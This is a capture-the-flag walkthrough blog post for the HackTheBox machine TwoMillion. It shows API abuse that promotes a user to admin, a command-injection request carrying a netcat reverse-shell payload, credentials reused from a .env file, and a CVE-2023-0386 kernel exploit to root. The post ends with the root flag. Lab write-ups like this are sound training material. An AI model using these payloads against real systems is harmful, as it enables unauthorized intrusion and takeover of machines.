---
layout: post
title: TwoMillion - Easy - Linux
date: 07-06-2023
categories: [CTF - HackTheBox]
tag: [API, PHP, Command Injection, OverlayFS, CVE-2023-0386]
---

First step was to enumerate the API and reveal an endpoint which allowed new user registration. After registering a PHP token was granted which unlocked the ability to interact with other endpoints. It was possible to exploit the new endpoints to upgrade the user to admin which then unlocked more endpoints. One of the endpoints admin had access to was vulnerable to command injection and used to obtain a reverse shell. It was possible to switch users using the database password. Root was obtained by exploiting a kernel vulnerability.

# Nmap Output
```
# Nmap 7.93 scan initiated Sun Jun 25 17:23:24 2023 as: nmap -sC -sV -p- -oA nmap/twomillion-allports -v 10.129.229.66
Nmap scan report for 10.129.229.66
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 25 17:23:52 2023 -- 1 IP address (1 host up) scanned in 28.20 seconds
```
# 2million.htb - Port 80
![ba1aab68e662e56f215ac6dab09bd713.png](/assets/img/ba1aab68e662e56f215ac6dab09bd713.png)
# ffuf - Web Directory
```
┌─[parrot@parrotos]─[~/htb/twomillion]
└──╼ $ffuf -u http://2million.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 41ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 53ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 31ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 37ms]
:: Progress: [63087/63087] :: Job [1/1] :: 530 req/sec :: Duration: [0:02:04] :: Errors: 0 ::
```
# Generate invite code via API
The website is requesting an invitation code as a requirement for new user registration. There is an endpoint which generates the invitation code as shown below.

```
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=8c4gbnojk6ec2h69htfgqkjo5v
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
## Reponse - invite code
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 25 Jun 2023 16:46:32 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91



{"0":200,"success":1,"data":{"code":"UTgxVk8tWVcwSzctRjNOUE8tS0xQM0g=","format":"encoded"}}
```
# Set user to admin via API

After logging into the website there was nothing of value. Further enumeration of the API revealed an admin endpoint. This endpoint required the PHPSESSID Cookie to be set. This cookie was given after registering and logging into the website.

Using this endpoint made it possible to upgrade a user to admin.

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://2million.htb/home/access
DNT: 1
Connection: close
Cookie: PHPSESSID=8c4gbnojk6ec2h69htfgqkjo5v
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 46

{
"email":"testuser@htb.com",
"is_admin":1
}
```
## Reponse - set user to admin
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 25 Jun 2023 17:14:55 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 47

{
"id":13,"username":"testuser","is_admin":1
}
```
# RCE via API

The user is now set as admin which will allow access to the below endpoint as long as a new PHPSESSID is generated after the modification. This endpoint generates an OpenVPN certificate for admin users. The generated certificate was a rabbithole. This endpoint was vulnerable to command injection. Below is the request used to obtain a reverse shell.

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://2million.htb/home/access
DNT: 1
Connection: close
Cookie: PHPSESSID=8c4gbnojk6ec2h69htfgqkjo5v
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 101

{
"username":"test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 9001 >/tmp/f"
}
```
## Reverse shell returned (www-data) 
```
┌─[parrot@parrotos]─[~/htb/twomillion]
└──╼ $nc -lvnp 9001             
listening on [any] 9001 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.229.66] 41268                          
/bin/sh: 0: can't access tty; job control turned off                                   
$ 
```
# Enumerating web directory - finding DB password
```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jun 25 17:20 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Jun 25 17:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuper******
```
# Logging in as admin with DB creds
```
www-data@2million:~/html$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jun  6 10:22 .
drwxr-xr-x 3 root  root  4096 Jun  6 10:22 ..
lrwxrwxrwx 1 root  root     9 May 26 22:53 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26 22:53 .bash_logout
-rw-r--r-- 1 admin admin 3771 May 26 22:53 .bashrc
drwx------ 2 admin admin 4096 Jun  6 10:22 .cache
-rw-r--r-- 1 admin admin  807 May 26 22:53 .profile
drwx------ 2 admin admin 4096 Jun  6 10:22 .ssh
-rw-r----- 1 root  admin   33 Jun 25 16:23 user.txt
admin@2million:~$ 
```
# Escalating to root
Reading the mail directory uncovered a hint suggesting the machine is outdated and vulernable to a kernel exploit. 

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
## CVE-2023-0386 - OverlayFS
Source: https://github.com/xkaneiki/CVE-2023-0386

Exploit gives compile instructions and requires two terminals to be open. A command is run in each terminal and it should grant root access.

Terminal 1:
```
admin@2million:~/CVE-2023-0386$ ls
Makefile  README.md  exp  exp.c  fuse  fuse.c  gc  getshell.c  ovlcap  test
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```

Terminal 2:
```
root@2million:~/CVE-2023-0386# ./exp
uid:0 gid:0
[+] mount success
ls: reading directory './ovlcap/merge': Permission denied
total 0
open: Permission denied
[+] exploit success!
```

## Root flag
Root access granted.

```
root@2million:/root# ls -la
total 48
drwx------  8 root root 4096 Jun 25 16:23 .
drwxr-xr-x 19 root root 4096 Jun  6 10:22 ..
lrwxrwxrwx  1 root root    9 Apr 27 16:10 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jun  6 10:22 .cache
drwxr-xr-x  3 root root 4096 Jun  6 10:22 .cleanup
drwx------  4 root root 4096 Jun  6 10:22 .gnupg
drwxr-xr-x  3 root root 4096 Jun  6 10:22 .local
lrwxrwxrwx  1 root root    9 May 26 22:55 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Jun  6 10:22 .ssh
-rw-r-----  1 root root   33 Jun 25 16:23 root.txt
drwx------  3 root root 4096 Jun  6 10:22 snap
-rw-r--r--  1 root root 3767 Jun  6 12:43 thank_you.json
root@2million:/root# cat root.txt
1a10e8bcdfe6992f1b781a4c96521dbf
```